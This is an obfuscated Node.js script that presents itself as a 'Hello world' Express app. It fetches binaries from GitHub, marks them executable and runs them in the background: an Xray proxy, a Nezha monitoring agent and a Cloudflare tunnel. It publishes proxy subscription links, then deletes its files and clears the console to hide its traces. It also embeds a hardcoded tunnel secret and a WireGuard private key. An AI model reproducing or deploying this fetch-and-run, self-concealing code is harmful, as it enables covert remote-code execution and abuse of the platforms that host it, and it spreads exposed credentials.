const FILE_PATH = process.env.FILE_PATH || './temp'; // 运行文件夹，节点文件存放目录
const projectPageURL = process.env.URL || '';        // 项目域名，开启自动访问保活
const intervalInseconds = process.env.TIME || 120;   // 自动访问间隔时间（120秒）
const UUID = process.env.UUID || '02039208-7f6c-4375-7aea-501cc5fce2ee';
const NEZHA_SERVER = process.env.NEZHA_SERVER || ''; // 哪吒探针服务器
const NEZHA_PORT = process.env.NEZHA_PORT || '5555';
const NEZHA_KEY = process.env.NEZHA_KEY || '';
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'decodeeoce.ttccf.ggff.net';
const ARGO_AUTH = process.env.ARGO_AUTH || '{"AccountTag":"7da1fc016ae3e32b37a5a3b33cde621b","TunnelSecret":"mDxkUMNDHl4NmlVluUYse69zeYIXWAlV370W/l+bUfA=","TunnelID":"967db3bc-822c-4f16-87b8-c0e4ea22d270","Endpoint":""}';
const CFIP = process.env.CFIP || 'government.se';
const CFPORT = process.env.CFPORT || 443;
const NAME = process.env.NAME || 'Codbox';
const ARGO_PORT = process.env.ARGO_PORT || 8080;
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;

const _0x1b4713 = _0x4107;
(function(_0x49582b, _0x1ddd05) {
    const _0x3ae80b = _0x4107, _0x194fc3 = _0x49582b();
    while (!![]) {
        try {
            const _0xdee72f = parseInt(_0x3ae80b(0x203)) / 0x1 * (-parseInt(_0x3ae80b(0x20e)) / 0x2) + parseInt(_0x3ae80b(0x1a8)) / 0x3 * (-parseInt(_0x3ae80b(0x1f3)) / 0x4) + parseInt(_0x3ae80b(0x1bd)) / 0x5 + -parseInt(_0x3ae80b(0x198)) / 0x6 * (parseInt(_0x3ae80b(0x1a4)) / 0x7) + -parseInt(_0x3ae80b(0x200)) / 0x8 + -parseInt(_0x3ae80b(0x20b)) / 0x9 + parseInt(_0x3ae80b(0x1cd)) / 0xa;
            if (_0xdee72f === _0x1ddd05) break;
            else _0x194fc3['push'](_0x194fc3['shift']());
        } catch (_0x356bba) {
            _0x194fc3['push'](_0x194fc3['shift']());
        }
    }
}(_0x1a0a, 0x1e6e1));

const express = require(_0x1b4713(0x1f1));
const app = express();
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require(_0x1b4713(0x1fd));
const { promisify } = require(_0x1b4713(0x1ae));
const exec = promisify(require(_0x1b4713(0x1ba))[_0x1b4713(0x20c)]);
const { execSync } = require(_0x1b4713(0x1ba));

// 初始化目录
!fs['existsSync'](FILE_PATH) ? (fs['mkdirSync'](FILE_PATH), console[_0x1b4713(0x1fa)](FILE_PATH + _0x1b4713(0x1ce))) : console[_0x1b4713(0x1fa)](FILE_PATH + _0x1b4713(0x1d1));

const pathsToDelete = [_0x1b4713(0x1cf), 'bot', 'npm', _0x1b4713(0x1ac), _0x1b4713(0x190)];
function cleanupOldFiles() {
    const _0x5b42fb = _0x1b4713;
    pathsToDelete[_0x5b42fb(0x213)](_0x21ee5a => {
        const _0x280246 = _0x5b42fb;
        const _0x55b819 = path[_0x280246(0x1f2)](FILE_PATH, _0x21ee5a);
        fs[_0x280246(0x1f0)](_0x55b819, _0x49b4f5 => {
            const _0x5b23c2 = _0x280246;
            _0x49b4f5 ? console['error'](_0x5b23c2(0x20f) + _0x55b819) : console[_0x5b23c2(0x1fa)](_0x55b819 + _0x5b23c2(0x207));
        });
    });
}
cleanupOldFiles();

// 主页路由
app[_0x1b4713(0x196)]('/', function(_0x4ffb29, _0x41c7b5) {
    const _0x2c1488 = _0x1b4713;
    _0x41c7b5['send'](_0x2c1488(0x21d));
});

// 重启路由
app.get('/restart', async (req, res) => {
    console.log('Restart requested via external URL');
    await downloadFilesAndRun(); // 只重新执行核心逻辑，避免重复监听端口
    res.send('Service restarted successfully');
});

// Xray 配置
const config = {
    'log': { 'access': _0x1b4713(0x1c7), 'error': _0x1b4713(0x1c7), 'loglevel': _0x1b4713(0x1e7) },
    'inbounds': [
        { 'port': ARGO_PORT, 'protocol': 'vless', 'settings': { 'clients': [{ 'id': UUID, 'flow': _0x1b4713(0x1e6) }], 'decryption': _0x1b4713(0x1e7), 'fallbacks': [{ 'dest': 0xbb9 }, { 'path': _0x1b4713(0x209), 'dest': 0xbba }, { 'path': _0x1b4713(0x21b), 'dest': 0xbbb }, { 'path': _0x1b4713(0x199), 'dest': 0xbbc }] }, 'streamSettings': { 'network': _0x1b4713(0x1cc) } },
        { 'port': 0xbb9, 'listen': _0x1b4713(0x208), 'protocol': _0x1b4713(0x1df), 'settings': { 'clients': [{ 'id': UUID }], 'decryption': _0x1b4713(0x1e7) }, 'streamSettings': { 'network': 'ws', 'security': 'none' } },
        { 'port': 0xbba, 'listen': _0x1b4713(0x208), 'protocol': 'vless', 'settings': { 'clients': [{ 'id': UUID, 'level': 0x0 }], 'decryption': _0x1b4713(0x1e7) }, 'streamSettings': { 'network': 'ws', 'security': 'none', 'wsSettings': { 'path': _0x1b4713(0x209) } }, 'sniffing': { 'enabled': !!{}, 'destOverride': [_0x1b4713(0x1fb), _0x1b4713(0x1d0), _0x1b4713(0x195)], 'metadataOnly': ![] } },
        { 'port': 0xbbb, 'listen': _0x1b4713(0x208), 'protocol': _0x1b4713(0x1a7), 'settings': { 'clients': [{ 'id': UUID, 'alterId': 0x0 }] }, 'streamSettings': { 'network': 'ws', 'wsSettings': { 'path': _0x1b4713(0x21b) } }, 'sniffing': { 'enabled': !!{}, 'destOverride': ['http', _0x1b4713(0x1d0), _0x1b4713(0x195)], 'metadataOnly': ![] } },
        { 'port': 0xbbc, 'listen': _0x1b4713(0x208), 'protocol': _0x1b4713(0x21e), 'settings': { 'clients': [{ 'password': UUID }] }, 'streamSettings': { 'network': 'ws', 'security': 'none', 'wsSettings': { 'path': _0x1b4713(0x199) } }, 'sniffing': { 'enabled': !!{}, 'destOverride': [_0x1b4713(0x1fb), 'tls', _0x1b4713(0x195)], 'metadataOnly': ![] } }
    ],
    'dns': { 'servers': [_0x1b4713(0x1d6)] },
    'outbounds': [
        { 'protocol': _0x1b4713(0x202) },
        { 'tag': _0x1b4713(0x1ca), 'protocol': 'wireguard', 'settings': { 'secretKey': _0x1b4713(0x1c1), 'address': ['172.16.0.2/32', _0x1b4713(0x1b1)], 'peers': [{ 'publicKey': _0x1b4713(0x1ef), 'allowedIPs': [_0x1b4713(0x1f7), _0x1b4713(0x1a6)], 'endpoint': _0x1b4713(0x1c5) }], 'reserved': [0x4e, 0x87, 0x4c], 'mtu': 0x500 } }
    ],
    'routing': { 'domainStrategy': _0x1b4713(0x1ff), 'rules': [{ 'type': 'field', 'domain': [_0x1b4713(0x1cb), _0x1b4713(0x1a0)], 'outboundTag': _0x1b4713(0x1ca) }] }
};
fs[_0x1b4713(0x1d2)](path[_0x1b4713(0x1f2)](FILE_PATH, _0x1b4713(0x201)), JSON[_0x1b4713(0x1f4)](config, null, 0x2));

function getSystemArchitecture() {
    const _0x3b0fb4 = _0x1b4713;
    const _0x280055 = os[_0x3b0fb4(0x1e4)]();
    return _0x280055 === _0x3b0fb4(0x1d8) || _0x280055 === _0x3b0fb4(0x1c3) || _0x280055 === 'aarch64' ? 'arm' : 'amd';
}

function downloadFile(_0x517907, _0x4e9d69, _0x421d22) {
    const _0x1d1231 = _0x1b4713;
    const _0x20c327 = path[_0x1d1231(0x1f2)](FILE_PATH, _0x517907);
    const _0x209450 = fs[_0x1d1231(0x20a)](_0x20c327);
    axios({ 'method': _0x1d1231(0x196), 'url': _0x4e9d69, 'responseType': _0x1d1231(0x1e0) })[_0x1d1231(0x1dd)](_0x56cd62 => {
        const _0x39a771 = _0x1d1231;
        _0x56cd62[_0x39a771(0x193)]['pipe'](_0x209450);
        _0x209450['on']('finish', () => {
            const _0x49f712 = _0x39a771;
            _0x209450['close']();
            console[_0x49f712(0x1fa)](_0x49f712(0x1d4) + _0x517907 + _0x49f712(0x214));
            _0x421d22(null, _0x517907);
        });
        _0x209450['on'](_0x39a771(0x1b0), _0x40507b => {
            const _0xcfb26e = _0x39a771;
            fs[_0xcfb26e(0x1f0)](_0x20c327, () => {});
            const _0x55e98c = _0xcfb26e(0x1d4) + _0x517907 + '\x20failed:\x20' + _0x40507b[_0xcfb26e(0x194)];
            console['error'](_0x55e98c);
            _0x421d22(_0x55e98c);
        });
    })['catch'](_0x37ed79 => {
        const _0x1b9b15 = _0x1d1231;
        const _0x5ce31f = _0x1b9b15(0x1d4) + _0x517907 + _0x1b9b15(0x1b5) + _0x37ed79[_0x1b9b15(0x194)];
        console[_0x1b9b15(0x1b0)](_0x5ce31f);
        _0x421d22(_0x5ce31f);
    });
}

async function downloadFilesAndRun() {
    const _0x260f61 = _0x1b4713;
    const _0x4277ac = getSystemArchitecture();
    const _0x3b875e = getFilesForArchitecture(_0x4277ac);
    if (_0x3b875e['length'] === 0x0) {
        console[_0x260f61(0x1fa)](_0x260f61(0x1b7));
        return;
    }
    const _0x389e50 = _0x3b875e['map'](_0xf5d897 => {
        return new Promise((_0x4c113d, _0x4d2609) => {
            const _0xccb0e4 = _0x4107;
            downloadFile(_0xf5d897[_0xccb0e4(0x21f)], _0xf5d897[_0xccb0e4(0x1be)], (_0x37b9c3, _0x146b40) => {
                _0x37b9c3 ? _0x4d2609(_0x37b9c3) : _0x4c113d(_0x146b40);
            });
        });
    });
    try {
        await Promise[_0x260f61(0x1e3)](_0x389e50);
    } catch (_0x3ce320) {
        console[_0x260f61(0x1b0)](_0x260f61(0x215), _0x3ce320);
        return;
    }
    function _0x12c616(_0x515541) {
        const _0x3c9064 = _0x260f61;
        const _0x1c130f = 0x1fd;
        _0x515541[_0x3c9064(0x213)](_0x5a5e09 => {
            const _0x4c1de8 = _0x3c9064;
            const _0x40973f = path[_0x4c1de8(0x1f2)](FILE_PATH, _0x5a5e09);
            fs['chmod'](_0x40973f, _0x1c130f, _0x3ec4ec => {
                const _0x28633b = _0x4c1de8;
                _0x3ec4ec ? console[_0x28633b(0x1b0)](_0x28633b(0x1e5) + _0x40973f + ': ' + _0x3ec4ec) : console[_0x28633b(0x1fa)](_0x28633b(0x219) + _0x40973f + ': ' + _0x1c130f[_0x28633b(0x1f6)](0x8));
            });
        });
    }
    const _0x2d3f86 = [_0x260f61(0x1a2), _0x260f61(0x1f8), './bot'];
    _0x12c616(_0x2d3f86);

    let _0x49df17 = '';
    if (NEZHA_SERVER && NEZHA_PORT && NEZHA_KEY) {
        const _0x15fe7d = ['443', _0x260f61(0x1ea), _0x260f61(0x1b3), _0x260f61(0x211), '2083', '2053'];
        _0x15fe7d[_0x260f61(0x1a9)](NEZHA_PORT) ? _0x49df17 = _0x260f61(0x217) : _0x49df17 = '';
        const _0x511b01 = 'nohup ' + FILE_PATH + _0x260f61(0x1a1) + NEZHA_SERVER + ':' + NEZHA_PORT + _0x260f61(0x1e2) + NEZHA_KEY + ' ' + _0x49df17 + ' >/dev/null 2>&1 &';
        try {
            await exec(_0x511b01);
            console['log'](_0x260f61(0x1a3));
            await new Promise(_0x3eb288 => setTimeout(_0x3eb288, 0x3e8));
        } catch (_0xb57c37) {
            console[_0x260f61(0x1b0)](_0x260f61(0x1ec) + _0xb57c37);
        }
    } else console['log'](_0x260f61(0x1d9));

    const _0xb16123 = _0x260f61(0x1aa) + FILE_PATH + _0x260f61(0x1ad) + FILE_PATH + _0x260f61(0x1b4);
    try {
        await exec(_0xb16123);
        console['log'](_0x260f61(0x1db));
        await new Promise(_0x492045 => setTimeout(_0x492045, 0x3e8));
    } catch (_0x512ad3) {
        console[_0x260f61(0x1b0)](_0x260f61(0x1c6) + _0x512ad3);
    }

    if (fs[_0x260f61(0x18f)](path[_0x260f61(0x1f2)](FILE_PATH, 'bot'))) {
        let _0x5db304;
        if (ARGO_AUTH[_0x260f61(0x1c8)](/^[A-Z0-9a-z=]{120,250}$/)) {
            _0x5db304 = 'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ' + ARGO_AUTH;
        } else if (ARGO_AUTH['match'](/TunnelSecret/)) {
            _0x5db304 = 'tunnel --edge-ip-version auto --config ' + FILE_PATH + _0x260f61(0x19d);
        } else {
            _0x5db304 = _0x260f61(0x1e8) + FILE_PATH + '/boot.log --loglevel info --url http://localhost:' + ARGO_PORT;
        }
        try {
            await exec('nohup ' + FILE_PATH + '/bot ' + _0x5db304 + _0x260f61(0x1e9));
            console[_0x260f61(0x1fa)](_0x260f61(0x1dc));
            await new Promise(_0x4a2eaa => setTimeout(_0x4a2eaa, 0x7d0));
        } catch (_0x5d015f) {
            console[_0x260f61(0x1b0)](_0x260f61(0x1d7) + _0x5d015f);
        }
    }
    await new Promise(_0xa4457a => setTimeout(_0xa4457a, 0x1388));
}

function getFilesForArchitecture(_0x3d6a21) {
    const _0x3e0d8b = _0x1b4713;
    if (_0x3d6a21 === _0x3e0d8b(0x1d8)) {
        return [
            { 'fileName': _0x3e0d8b(0x1d3), 'fileUrl': _0x3e0d8b(0x1c2) },
            { 'fileName': _0x3e0d8b(0x1cf), 'fileUrl': _0x3e0d8b(0x206) },
            { 'fileName': _0x3e0d8b(0x197), 'fileUrl': _0x3e0d8b(0x1ab) }
        ];
    } else if (_0x3d6a21 === _0x3e0d8b(0x1bc)) {
        return [
            { 'fileName': _0x3e0d8b(0x1d3), 'fileUrl': _0x3e0d8b(0x1c0) },
            { 'fileName': 'web', 'fileUrl': _0x3e0d8b(0x1af) },
            { 'fileName': _0x3e0d8b(0x197), 'fileUrl': _0x3e0d8b(0x1c4) }
        ];
    }
    return [];
}

function argoType() {
    const _0x2f76e9 = _0x1b4713;
    if (!ARGO_AUTH || !ARGO_DOMAIN) {
        console[_0x2f76e9(0x1fa)]('ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels');
        return;
    }
    if (ARGO_AUTH['includes'](_0x2f76e9(0x212))) {
        fs[_0x2f76e9(0x1d2)](path[_0x2f76e9(0x1f2)](FILE_PATH, _0x2f76e9(0x216)), ARGO_AUTH);
        const _0x2ffcb9 = _0x2f76e9(0x1b2) + ARGO_AUTH[_0x2f76e9(0x21a)]('\x22')[0xb] + '\x0a  credentials-file: ' + path[_0x2f76e9(0x1f2)](FILE_PATH, _0x2f76e9(0x216)) + _0x2f76e9(0x1ee) + ARGO_DOMAIN + _0x2f76e9(0x1eb) + ARGO_PORT + '\x0a      originRequest:\x0a        noTLSVerify: true\x0a    - service: http_status:404\x0a  ';
        fs[_0x2f76e9(0x1d2)](path[_0x2f76e9(0x1f2)](FILE_PATH, 'tunnel.yml'), _0x2ffcb9);
    } else console[_0x2f76e9(0x1fa)]('ARGO_AUTH mismatch TunnelSecret, use token connect to tunnel');
}
argoType();

async function extractDomains() {
    const _0x2d0c0b = _0x1b4713;
    let _0x5a01d2;
    if (ARGO_AUTH && ARGO_DOMAIN) {
        _0x5a01d2 = ARGO_DOMAIN;
        console[_0x2d0c0b(0x1fa)](_0x2d0c0b(0x1d5), _0x5a01d2);
        await _0x3db339(_0x5a01d2);
    } else {
        try {
            const _0x3e7ee4 = fs['readFileSync'](path[_0x2d0c0b(0x1f2)](FILE_PATH, _0x2d0c0b(0x190)), 'utf-8');
            const _0x3ddbc1 = _0x3e7ee4[_0x2d0c0b(0x21a)]('\x0a');
            const _0x3aaaec = [];
            _0x3ddbc1[_0x2d0c0b(0x213)](_0x2aa96d => {
                const _0x43d768 = _0x2d0c0b;
                const _0x4ee5ef = _0x2aa96d[_0x43d768(0x1c8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
                if (_0x4ee5ef) {
                    const _0x11a5d5 = _0x4ee5ef[0x1];
                    _0x3aaaec[_0x43d768(0x191)](_0x11a5d5);
                }
            });
            if (_0x3aaaec[_0x2d0c0b(0x1b6)] > 0x0) {
                _0x5a01d2 = _0x3aaaec[0x0];
                console['log'](_0x2d0c0b(0x1de), _0x5a01d2);
                await _0x3db339(_0x5a01d2);
            } else {
                console[_0x2d0c0b(0x1fa)]('ArgoDomain not found, re-running bot to obtain ArgoDomain');
                fs[_0x2d0c0b(0x19a)](path[_0x2d0c0b(0x1f2)](FILE_PATH, _0x2d0c0b(0x190)));
                await new Promise(_0x48bc05 => setTimeout(_0x48bc05, 0x7d0));
                const _0x42651c = _0x2d0c0b(0x1e8) + FILE_PATH + _0x2d0c0b(0x1a5) + ARGO_PORT;
                try {
                    await exec('nohup ' + path[_0x2d0c0b(0x1f2)](FILE_PATH, _0x2d0c0b(0x197)) + ' ' + _0x42651c + ' >/dev/null 2>&1 &');
                    console[_0x2d0c0b(0x1fa)](_0x2d0c0b(0x1f9));
                    await new Promise(_0x3d748d => setTimeout(_0x3d748d, 0xbb8));
                    await extractDomains();
                } catch (_0x29b197) {
                    console[_0x2d0c0b(0x1b0)](_0x2d0c0b(0x1d7) + _0x29b197);
                }
            }
        } catch (_0x1c8e60) {
            console[_0x2d0c0b(0x1b0)]('Error reading boot.log:', _0x1c8e60);
        }
    }
    async function _0x3db339(_0x5f21cd) {
        const _0x344696 = _0x2d0c0b;
        const _0x14f215 = execSync(_0x344696(0x1fe), { 'encoding': _0x344696(0x1bf) });
        const _0x11ede8 = _0x14f215[_0x344696(0x18c)]();
        return new Promise(_0x41b261 => {
            setTimeout(() => {
                const _0x336581 = _0x4107;
                const _0x2b51d4 = { 'v': '2', 'ps': NAME + '-' + _0x11ede8, 'add': CFIP, 'port': CFPORT, 'id': UUID, 'aid': '0', 'scy': 'none', 'net': 'ws', 'type': _0x336581(0x1e7), 'host': _0x5f21cd, 'path': _0x336581(0x1e1), 'tls': _0x336581(0x1d0), 'sni': _0x5f21cd, 'alpn': '' };
                const _0x4d4498 = _0x336581(0x204) + UUID + '@' + CFIP + ':' + CFPORT + _0x336581(0x1c9) + _0x5f21cd + _0x336581(0x20d) + _0x5f21cd + _0x336581(0x1fc) + NAME + '-' + _0x11ede8 + _0x336581(0x19c) + Buffer[_0x336581(0x218)](JSON[_0x336581(0x1f4)](_0x2b51d4))[_0x336581(0x1f6)](_0x336581(0x205)) + '\x0a  trojan://' + UUID + '@' + CFIP + ':' + CFPORT + _0x336581(0x1ed) + _0x5f21cd + _0x336581(0x20d) + _0x5f21cd + _0x336581(0x21c) + NAME + '-' + _0x11ede8 + _0x336581(0x210);
                console[_0x336581(0x1fa)](Buffer[_0x336581(0x218)](_0x4d4498)['toString'](_0x336581(0x205)));
                const _0x3b0229 = path[_0x336581(0x1f2)](FILE_PATH, _0x336581(0x1ac));
                fs[_0x336581(0x1d2)](_0x3b0229, Buffer[_0x336581(0x218)](_0x4d4498)[_0x336581(0x1f6)](_0x336581(0x205)));
                console['log'](FILE_PATH + _0x336581(0x1b9));
                app[_0x336581(0x196)](_0x336581(0x1da), (_0x491e6a, _0x58cfe1) => {
                    const _0x138593 = _0x336581;
                    const _0x3e52eb = Buffer[_0x138593(0x218)](_0x4d4498)[_0x138593(0x1f6)](_0x138593(0x205));
                    _0x58cfe1[_0x138593(0x1b8)](_0x138593(0x1bb), 'text/plain; charset=utf-8');
                    _0x58cfe1[_0x138593(0x192)](_0x3e52eb);
                });
                _0x41b261(_0x4d4498);
            }, 0x7d0);
        });
    }
}

const npmPath = path[_0x1b4713(0x1f2)](FILE_PATH, _0x1b4713(0x1d3));
const webPath = path['join'](FILE_PATH, _0x1b4713(0x1cf));
const botPath = path[_0x1b4713(0x1f2)](FILE_PATH, _0x1b4713(0x197));
const bootLogPath = path[_0x1b4713(0x1f2)](FILE_PATH, 'boot.log');
const configPath = path[_0x1b4713(0x1f2)](FILE_PATH, 'config.json');

function cleanFiles() {
    setTimeout(() => {
        const _0x1ec285 = _0x4107;
        exec(_0x1ec285(0x18e) + bootLogPath + ' ' + configPath + ' ' + npmPath + ' ' + webPath + ' ' + botPath, (_0x3747ec, _0x7e848a, _0x58ad45) => {
            const _0x57b7b2 = _0x1ec285;
            if (_0x3747ec) {
                console[_0x57b7b2(0x1b0)](_0x57b7b2(0x19e) + _0x3747ec);
                return;
            }
            console[_0x57b7b2(0x1f5)]();
            console[_0x57b7b2(0x1fa)]('App is running');
            console[_0x57b7b2(0x1fa)](_0x57b7b2(0x19b));
        });
    }, 0xea60);
}
cleanFiles();

let hasLoggedEmptyMessage = ![];
async function visitProjectPage() {
    const _0x2b7de3 = _0x1b4713;
    try {
        if (!projectPageURL || !intervalInseconds) {
            !hasLoggedEmptyMessage && (console['log'](_0x2b7de3(0x19f)), hasLoggedEmptyMessage = !![]);
            return;
        } else hasLoggedEmptyMessage = ![];
        await axios[_0x2b7de3(0x196)](projectPageURL);
        console[_0x2b7de3(0x1fa)](_0x2b7de3(0x18d));
        console[_0x2b7de3(0x1f5)]();
    } catch (_0x49c845) {
        console[_0x2b7de3(0x1b0)]('Error visiting project page:', _0x49c845[_0x2b7de3(0x194)]);
    }
}
setInterval(visitProjectPage, intervalInseconds * 0x3e8);

async function startServer() {
    await downloadFilesAndRun();
    await extractDomains();
    visitProjectPage();
}

function _0x4107(_0x647a0d, _0x3f3085) {
    const _0x1a0ae2 = _0x1a0a();
    return _0x4107 = function(_0x410714, _0x338aa6) {
        _0x410714 = _0x410714 - 0x18c;
        let _0x7aed69 = _0x1a0ae2[_0x410714];
        return _0x7aed69;
    }, _0x4107(_0x647a0d, _0x3f3085);
}

function _0x1a0a() {
    const _0xedb496 = ['vmess', '51159LdPTet', 'includes', 'nohup ', 'https://github.com/eooce/test/releases/download/arm64/bot13', 'sub.txt', '/web -c ', 'util', 'https://github.com/eooce/test/raw/main/web', 'error', '2606:4700:110:8a36:df92:102a:9602:fa18/128', '\x0a  tunnel: ', '2096', '/config.json >/dev/null 2>&1 &', ' failed: ', 'length', 'Can\'t find a file for the current architecture', 'set', '/sub.txt saved successfully', 'child_process', 'Content-Type', 'amd', '499440KVpOFt', 'fileUrl', 'utf-8', 'https://github.com/eooce/test/raw/main/amd64', 'YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=', 'https://github.com/eooce/test/releases/download/ARM/swith', 'arm64', 'https://github.com/eooce/test/raw/main/server', '162.159.193.10:2408', 'web running error: ', '/dev/null', 'match', '?encryption=none&security=tls&sni=', 'WARP', 'domain:openai.com', 'tcp', '8895280Qrvdbj', ' is created', 'web', 'tls', ' already exists', 'writeFileSync', 'npm', 'Download ', 'ARGO_DOMAIN:', 'https+local://8.8.8.8/dns-query', 'Error executing command: ', 'arm', 'NEZHA variable is empty,skip running', '/sub', 'web is running', 'bot is running', 'then', 'ArgoDomain:', 'vless', 'stream', '/vmess?ed=2048', ' -p ', 'all', 'arch', 'Empowerment failed for ', 'xtls-rprx-vision', 'none', 'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ', ' >/dev/null 2>&1 &', '8443', '\x0a      service: http://localhost:', 'npm running error: ', '?security=tls&sni=', '\x0a  protocol: http2\x0a  \x0a  ingress:\x0a    - hostname: ', 'bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=', 'unlink', 'express', 'join', '24GZPYEb', 'stringify', 'clear', 'toString', '0.0.0.0/0', './web', 'bot is running.', 'log', 'http', '&path=%2Fvless%3Fed%3D2048#', 'path', 'curl -s https://speed.cloudflare.com/meta | awk -F\\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'', 'AsIs', '1537288LYBhsl', 'config.json', 'freedom', '2ugmrET', '\x0avless://', '&type=ws&host=', '202438PDyyNZ', 'Skip Delete ', '\x0a    ', '2087', 'TunnelSecret', 'forEach', ' successfully', 'Error downloading files:', 'tunnel.json', '--tls', 'from', 'Empowerment success for ', 'split', '/vmess', '&path=%2Ftrojan%3Fed%3D2048#', 'Hello world!', 'trojan', 'fileName', 'trim', 'Page visited successfully', 'rm -rf ', 'existsSync', 'boot.log', 'push', 'send', 'data', 'message', 'quic', 'get', 'bot', '102DSYoVF', '/trojan', 'unlinkSync', 'Thank you for using this script, enjoy!', '\x0a  \x0avmess://', '/tunnel.yml run', 'Error while deleting files: ', 'URL or TIME variable is empty,skip visit url', 'domain:ai.com', '/npm -s ', './npm', 'npm is running', '51723uKlwDW', '/boot.log --loglevel info --url http://localhost:', '::/0'];
    _0x1a0a = function() { return _0xedb496; };
    return _0x1a0a();
}

startServer();
app['listen'](PORT, () => console[_0x1b4713(0x1fa)]('Http server is running on port:' + PORT + '!'));
